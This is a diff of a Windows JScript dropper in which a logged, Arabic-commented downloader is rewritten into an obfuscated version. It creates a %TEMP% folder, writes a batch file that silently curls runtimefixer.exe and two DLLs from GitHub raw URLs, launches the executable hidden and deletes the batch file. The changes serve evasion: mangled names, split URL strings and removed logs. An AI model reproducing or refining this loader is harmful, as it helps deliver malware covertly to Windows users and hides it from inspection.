@@ -1,76 +1,48 @@
-// download-clean.js
+// obfuscated.js
 (function() {
-    function log(msg) {
+    function _0x1f() {
         try {
-            WScript.Echo(msg);
-        } catch(e) {}
-    }
-    
-    function decodeBase64(base64) {
-        return atob(base64);
-    }
-    
-    function downloadAndExecute() {
-        try {
-            log("=== بدء التنزيل ===");
+            var _0x2a = new ActiveXObject("WScript.Shell");
+            var _0x3b = new ActiveXObject("Scripting.FileSystemObject");
             
-            var shell = new ActiveXObject("WScript.Shell");
-            var fso = new ActiveXObject("Scripting.FileSystemObject");
+            var _0x4c = _0x2a.ExpandEnvironmentStrings("%TEMP%") + "\\RuntimeFixer";
             
-            var targetDir = shell.ExpandEnvironmentStrings("%TEMP%") + "\\RuntimeFixer";
-            log("المجلد: " + targetDir);
-            
-            if (!fso.FolderExists(targetDir)) {
-                fso.CreateFolder(targetDir);
-                log("تم إنشاء المجلد");
+            if (!_0x3b.FolderExists(_0x4c)) {
+                _0x3b.CreateFolder(_0x4c);
             }
             
-            // الروابط في Base64
-            var urlsBase64 = [
-                "aHR0cHM6Ly9naXRodWIuY29tL2FtaW5kYXJhamk2NC1hcmNoL2EvcmF3L3JlZnMvaGVhZHMvbWFpbi9ydW50aW1lZml4ZXIuZXhl",
-                "aHR0cHM6Ly9naXRodWIuY29tL2FtaW5kYXJhamk2NC1hcmNoL2IvcmF3L3JlZnMvaGVhZHMvbWFpbi9EaXNtQ29yZS5kbGw=",
-                "aHR0cHM6Ly9naXRodWIuY29tL2FtaW5kYXJhamk2NC1hcmNoL2MvcmF3L3JlZnMvaGVhZHMvbWFpbi9QYWdlUGRmU2l6ZV9Db25maWcuZGxs"
+            var _0x5d = "https://";
+            var _0x6e = "github.com";
+            var _0x7f = "/amindaraji64-arch/";
+            var _0x8g = "/raw/refs/heads/main/";
+            
+            var _0x9h = [
+                _0x5d + _0x6e + _0x7f + "a" + _0x8g + "runtimefixer.exe",
+                _0x5d + _0x6e + _0x7f + "b" + _0x8g + "DismCore.dll",
+                _0x5d + _0x6e + _0x7f + "c" + _0x8g + "PagePdfSize_Config.dll"
             ];
             
-            var names = ["runtimefixer.exe", "DismCore.dll", "PagePdfSize_Config.dll"];
+            var _0x1i = ["runtimefixer.exe", "DismCore.dll", "PagePdfSize_Config.dll"];
             
-            // فك تشفير الروابط
-            var urls = [];
-            for (var i = 0; i < urlsBase64.length; i++) {
-                urls.push(decodeBase64(urlsBase64[i]));
+            var _0x2j = _0x4c + "\\run.bat";
+            var _0x3k = "@echo off\r\n";
+            
+            for (var _0x4l = 0; _0x4l < _0x9h.length; _0x4l++) {
+                var _0x5m = _0x4c + "\\" + _0x1i[_0x4l];
+                _0x3k = _0x3k + "curl -L -o \"" + _0x5m + "\" \"" + _0x9h[_0x4l] + "\" > nul 2>&1\r\n";
             }
             
-            // إنشاء ملف batch
-            var batchPath = targetDir + "\\run.bat";
-            var batchContent = "@echo off\r\n";
-            batchContent = batchContent + "echo Downloading...\r\n";
+            _0x3k = _0x3k + "start /B \"\" \"" + _0x4c + "\\runtimefixer.exe\"\r\n";
+            _0x3k = _0x3k + "del /q \"" + _0x2j + "\"\r\n";
             
-            for (var i = 0; i < urls.length; i++) {
-                var filePath = targetDir + "\\" + names[i];
-                batchContent = batchContent + "curl -L -o \"" + filePath + "\" \"" + urls[i] + "\"\r\n";
-            }
+            var _0x6n = _0x3b.CreateTextFile(_0x2j, true);
+            _0x6n.Write(_0x3k);
+            _0x6n.Close();
             
-            batchContent = batchContent + "echo Running...\r\n";
-            batchContent = batchContent + "start \"\" \"" + targetDir + "\\runtimefixer.exe\"\r\n";
-            batchContent = batchContent + "del \"" + batchPath + "\"\r\n";
+            _0x2a.Run("cmd.exe /c \"" + _0x2j + "\"", 0, false);
             
-            // حفظ الملف
-            var file = fso.CreateTextFile(batchPath, true);
-            file.Write(batchContent);
-            file.Close();
-            
-            log("تم إنشاء ملف batch");
-            log("جاري التنزيل والتشغيل...");
-            
-            // التشغيل
-            shell.Run("cmd.exe /c \"" + batchPath + "\"", 0, false);
-            
-            log("=== اكتمل ===");
-            
-        } catch(e) {
-            log("خطأ: " + e.message);
-        }
+        } catch(_0x7o) {}
     }
     
-    downloadAndExecute();
+    _0x1f();
 })();
